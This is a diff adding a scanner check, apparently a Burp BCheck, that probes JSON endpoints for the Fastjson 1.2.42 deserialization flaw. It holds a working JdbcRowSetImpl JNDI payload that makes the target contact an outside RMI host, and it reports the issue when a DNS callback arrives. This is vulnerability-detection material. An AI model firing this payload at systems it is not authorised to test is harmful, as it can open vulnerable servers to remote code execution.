@@ -1,0 +1,24 @@
+metadata:
+  language: v1-beta
+  name: "Fastjson 1.2.42 Deserialization RCE"
+  description: "https://paper.seebug.org/1192/#rce-payload"
+  author: "JaveleyQAQ"
+  tags: "Fastjson", "Deserialization","RCE"
+
+define:
+    # payload = `\{"@type":"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://{generate_collaborator_address()}/a","autoCommit":true}`
+    payload = `\{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://{generate_collaborator_address()}/a", "autoCommit":true}`
+
+given request then
+
+  if {base.request.body} matches "^[{]" and "application/json" in {base.request.headers} then
+      send request called check:
+          body: {payload}
+      if dns interactions then
+          report issue:
+              severity: high
+              confidence: certain
+              detail: "https://paper.seebug.org/1192/#rce-payload."
+              remediation: "none"
+      end if 
+  end if
